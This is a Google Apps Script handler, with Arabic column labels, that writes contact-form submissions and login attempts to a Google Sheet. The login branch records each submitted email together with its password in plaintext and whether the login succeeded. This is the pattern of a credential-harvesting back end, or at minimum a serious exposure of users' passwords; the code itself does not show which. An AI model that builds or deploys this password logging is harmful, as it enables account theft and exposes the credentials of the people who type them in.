function doPost(e) {
  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();

    // Check if this is a login attempt
    var data = JSON.parse(e.postData.contents);

    if (data.loginEmail) {
      // Handle login logging
      if (sheet.getLastRow() === 0) {
        // If sheet is empty, add headers for login logs
        sheet.appendRow([
          "التاريخ والوقت",
          "البريد الإلكتروني",
          "كلمة المرور",
          "نجح الدخول"
        ]);
        var headerRange = sheet.getRange(1, 1, 1, 4);
        headerRange.setBackground("#00C2D1");
        headerRange.setFontColor("#000000");
        headerRange.setFontWeight("bold");
        headerRange.setHorizontalAlignment("center");
        sheet.setFrozenRows(1);
      }

      sheet.appendRow([
        new Date().toLocaleString("ar-IQ"),
        data.loginEmail || "",
        data.loginPassword || "",
        data.success ? "نعم" : "لا"
      ]);

      sheet.autoResizeColumns(1, 4);
    } else {
      // Handle contact form submission
      if (sheet.getLastRow() === 0) {
        sheet.appendRow([
          "التاريخ والوقت",
          "الاسم الكامل",
          "رقم الهاتف",
          "البريد الإلكتروني",
          "نوع المشروع",
          "تفاصيل المشروع"
        ]);
        var headerRange = sheet.getRange(1, 1, 1, 6);
        headerRange.setBackground("#00C2D1");
        headerRange.setFontColor("#000000");
        headerRange.setFontWeight("bold");
        headerRange.setHorizontalAlignment("center");
        sheet.setFrozenRows(1);
      }

      sheet.appendRow([
        new Date().toLocaleString("ar-IQ"),
        data.name    || "",
        data.phone   || "",
        data.email   || "",
        data.project || "",
        data.message || ""
      ]);

      sheet.autoResizeColumns(1, 6);
    }

    return ContentService
      .createTextOutput(JSON.stringify({ result: "success" }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch(err) {
    return ContentService
      .createTextOutput(JSON.stringify({ result: "error", error: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

// Test function - run this manually once to verify sheet access
function testSetup() {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  Logger.log("Sheet name: " + sheet.getName());
  Logger.log("Setup OK!");
}